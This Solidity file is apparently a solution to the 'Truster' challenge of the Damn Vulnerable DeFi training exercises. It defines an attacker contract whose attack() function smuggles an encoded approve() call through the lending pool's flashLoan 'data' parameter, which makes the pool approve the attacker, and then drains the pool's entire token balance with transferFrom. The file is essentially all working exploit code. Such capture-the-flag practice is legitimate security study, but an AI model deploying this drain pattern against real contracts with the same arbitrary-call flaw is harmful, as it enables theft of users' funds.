// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
interface TrusterLenderPool2 {
  function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract AttackerTrusterLenderPool {

    address public damnValuableToken;
    address public contractToAttack;
    //address public contratoSolo;

    constructor (address tokenAddress, address lenderPool) {
        damnValuableToken = tokenAddress;
        contractToAttack = lenderPool;
      //  contratoSolo = lenderPool;
    }

    function attack() public {
      uint256 balanceToSteal = IERC20(damnValuableToken).balanceOf(contractToAttack);
      bytes memory attackData = abi.encodeWithSignature('approve(address,uint256)',address(this),balanceToSteal);
      TrusterLenderPool2(contractToAttack).flashLoan(0, msg.sender, damnValuableToken, attackData);
      IERC20(damnValuableToken).transferFrom(contractToAttack, msg.sender, balanceToSteal);
    }


}